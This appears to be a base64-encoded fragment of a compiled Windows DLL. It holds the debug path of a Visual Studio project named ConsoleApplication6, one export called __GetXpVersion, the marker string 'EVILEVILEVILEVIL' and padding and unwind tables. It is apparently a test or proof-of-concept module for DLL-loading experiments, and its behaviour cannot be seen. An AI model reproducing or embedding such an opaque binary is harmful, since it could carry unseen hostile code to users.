AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFJTRFNdQSKmv4AXT4Kyl7nAja8lQgAAAEM6XFVzZXJzXHNzdXRoZXJsYW5kXERvY3VtZW50c1xWaXN1YWwgU3R1ZGlvIDIwMTVcUHJvamVjdHNcQ29uc29sZUFwcGxpY2F0aW9uNlx4NjRcRGVidWdcQ29uc29sZUFwcGxpY2F0aW9uNi5wZGIAAAAAAAAAABkAAAAZAAAAAwAAABYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAF4RAYABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA